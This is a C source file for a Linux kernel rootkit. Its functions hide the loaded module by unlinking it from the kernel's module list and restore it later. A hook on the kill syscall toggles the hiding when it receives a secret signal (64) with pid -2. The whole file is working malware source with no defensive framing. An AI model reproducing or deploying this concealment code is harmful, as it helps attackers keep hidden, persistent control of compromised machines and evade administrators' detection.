#include "hide_rootkit.h"
#include <linux/module.h>

extern struct module __this_module;

static short hidden = 0;

static struct list_head *prev_module;

static void hide_rootkit(void) {
  printk(KERN_INFO "Rootkit hidden\n");
  prev_module = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  hidden = 1;
}

static void show_rootkit(void) {
  printk(KERN_INFO "Rootkit shown\n");
  list_add(&THIS_MODULE->list, prev_module);
  hidden = 0;
}

static void hide_toggle(void) {
  if (hidden) {
    show_rootkit();
  } else {
    hide_rootkit();
  }
}

void sys_kill_kprobe_enter_handler(int sig, int pid) {
  if (sig == 64 && pid == -2) {
    hide_toggle();
  }
}
